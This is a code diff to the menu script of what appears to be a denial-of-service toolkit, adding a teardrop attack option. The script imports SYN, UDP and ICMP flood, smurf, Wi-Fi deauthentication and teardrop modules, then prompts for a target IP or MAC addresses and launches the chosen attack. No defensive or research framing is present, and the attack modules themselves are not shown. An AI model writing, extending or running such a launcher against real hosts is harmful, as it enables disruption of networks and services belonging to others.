@@ -1,4 +1,8 @@
-import Scripts.Deauther as Deauther, Scripts.SYNFlooder as SYNFlooder, Scripts.UDPFlooder as UDPFlooder, Scripts.ICMPFlooder as ICMPFlooder, Scripts.Smurf as Smurf
+import Scripts.Deauther as Deauther, \
+Scripts.SYNFlooder as SYNFlooder, \
+Scripts.UDPFlooder as UDPFlooder, \
+Scripts.ICMPFlooder as ICMPFlooder, \
+Scripts.Smurf as Smurf, Scripts.Teardropper as Teardropper
 
 def list_choice(choices=list()):
     menu = """
@@ -8,6 +12,7 @@ def list_choice(choices=list()):
     3) ICMP flood
     4) Smurf attack
     5) Deauthentication
+    6) Teardrop
     """
 
     if len(choices) == 0:
@@ -58,3 +63,9 @@ if __name__ == "__main__":
         count = input(">> ")
 
         Deauther.deauth(target_mac=target_mac, gateway_mac=gateway_mac, interface=iface, count=count)
+
+    elif choices[0] == 6:
+        print("Insert target IP")
+        target_ip = input(">> ")
+
+        Teardropper.attack(target_ip=target_ip)
